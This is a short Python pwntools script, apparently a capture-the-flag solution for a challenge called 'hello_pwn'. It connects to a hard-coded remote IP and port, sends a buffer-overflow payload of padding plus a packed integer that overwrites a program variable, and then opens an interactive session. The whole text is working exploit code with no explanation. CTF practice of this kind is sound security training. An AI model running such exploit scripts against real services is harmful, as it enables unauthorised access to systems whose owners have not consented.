from pwn import *
context(arch="amd64",os="linux",log_level="debug")
p = remote("111.198.29.45",34044)
#p = process("./hello_pwn")
p.recvline()
p.recvline()
payload="A"*4+p64(1853186401)
p.send(payload)
p.interactive()

